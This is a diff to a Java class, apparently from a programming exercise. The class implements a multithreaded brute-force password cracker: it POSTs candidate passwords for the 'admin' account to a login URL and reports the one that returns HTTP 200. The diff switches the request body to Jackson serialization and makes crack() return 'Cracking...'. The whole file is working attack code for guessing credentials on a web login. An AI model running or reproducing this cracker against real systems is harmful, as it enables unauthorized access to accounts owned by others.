@@ -1,5 +1,7 @@
 package org.example;
 
+import com.fasterxml.jackson.databind.ObjectMapper;
+
 import java.net.URI;
 import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
@@ -47,7 +49,6 @@ public class BlockingQueueHttpPwCracker implements PwCracker {
 
 
     public String crack(int maxLength, String url) {
-
         int numberOfCores = Runtime.getRuntime().availableProcessors();
         ExecutorService executor = Executors.newFixedThreadPool(numberOfCores - 1);
 
@@ -63,19 +64,20 @@ public class BlockingQueueHttpPwCracker implements PwCracker {
 
             executor.submit(() -> {
                 LocalTime start = LocalTime.now();
+                ObjectMapper objectMapper = new ObjectMapper();
                 String passWordToTry;
                 while(true) {
+                    passWordToTry = queue.take();
                     try {
-                        passWordToTry = queue.take();
                         HttpRequest request = HttpRequest.newBuilder()
                                 .uri(new URI(url))
                                 .headers("Content-Type", "application/json;charset=UTF-8")
-                                .POST(HttpRequest.BodyPublishers.ofString("{\"username\":\"admin\",\"password\":\"" + passWordToTry + "\"}"))
+                                .POST(HttpRequest.BodyPublishers.ofString(objectMapper.writeValueAsString(new User("admin", passWordToTry))))
                                 .build();
                         HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                         if (response.statusCode() == 200) {
                             System.out.println("Password found: " + passWordToTry);
-                            System.out.println("Time taken: " + start.until(LocalTime.now(), ChronoUnit.SECONDS) + " seconds");
+                            System.out.println("Time: " + start.until(LocalTime.now(), ChronoUnit.SECONDS) + " seconds");
                             executor.shutdownNow();
                             return passWordToTry;
                         }
@@ -87,10 +89,6 @@ public class BlockingQueueHttpPwCracker implements PwCracker {
             });
         }
 
-
-
-
-
-        return null;
+        return "Cracking...";
     }
 }
